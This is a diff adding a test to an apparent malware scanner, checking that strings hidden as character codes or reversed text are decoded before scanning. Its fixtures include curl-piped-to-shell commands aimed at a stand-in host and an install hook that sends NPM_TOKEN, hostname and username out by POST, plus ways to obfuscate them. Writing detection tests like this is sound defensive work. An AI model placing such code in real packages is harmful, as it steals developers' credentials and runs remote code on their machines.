@@ -708,3 +708,33 @@ test("benign Python packaging stays quiet", async () => {
   assert.deepEqual(serious, []);
   assert.ok(!rules(r).has("dep-typosquat"));
 });
+
+test("strings built from character codes or written backwards are rebuilt before scanning", async () => {
+  const js = "const {exec}=require('child_process');\nconst os=require('os');\nexec('curl -s http://x.example/p?h='+os.hostname()+' | sh');\n";
+  const py = "import os\nos.system('curl -s http://x.example/p | sh')\n";
+  const codes = s => [...s].map(c => c.charCodeAt(0)).join(", ");
+  const back = s => [...s].reverse().join("");
+  const rewrite = (text, fn) => text.replace(/'([^'\n]+)'/g, (m, s) => fn(s));
+  const r = await run(project({
+    "a.js": rewrite(js, s => `String.fromCharCode(${codes(s)})`),
+    "b.js": rewrite(js, s => `"${back(s)}".split("").reverse().join("")`),
+    "c.py": rewrite(py, s => `"".join(map(chr, [${codes(s)}]))`),
+    "d.py": rewrite(py, s => `"${back(s)}"[::-1]`),
+    "e.py": rewrite(py, s => `bytes([${codes(s)}]).decode()`),
+  }), { noIgnore: true });
+  for (const f of ["a.js", "b.js", "c.py", "d.py", "e.py"]) assert.ok(r.findings.some(x => x.file === f && / \(hidden\)$/.test(x.title)), f);
+
+  // The file an install script starts can be named backwards too.
+  const hook = await run(project({
+    "package.json": JSON.stringify({ name: "x", version: "1.0.0", scripts: { postinstall: "node index.js" } }),
+    "index.js": `require("ssecorp_dlihc".split("").reverse().join("")).fork("${back("lib/setup.js")}".split("").reverse().join(""));\n`,
+    "lib/setup.js": "const os = require('os');\nconst t = process.env.NPM_TOKEN;\nfetch('https://x.example/c', { method: 'POST', body: JSON.stringify({ t, h: os.hostname(), u: os.userInfo().username }) });\n",
+  }), { noIgnore: true });
+  assert.ok(hook.findings.some(f => f.rule === "install-time-capabilities" && f.file === "index.js"), "hidden fork target is followed");
+
+  const clean = await run(project({
+    "glyph.js": "const sep = String.fromCharCode(0x2028);\nconst A = String.fromCharCode(65);\nconst rev = s => s.split('').reverse().join('');\n",
+    "util.py": "word = 'olleh'[::-1]\nletters = ''.join(map(chr, [104, 105]))\n",
+  }), { noIgnore: true });
+  assert.equal(clean.findings.filter(f => / \(hidden\)$/.test(f.title)).length, 0);
+});
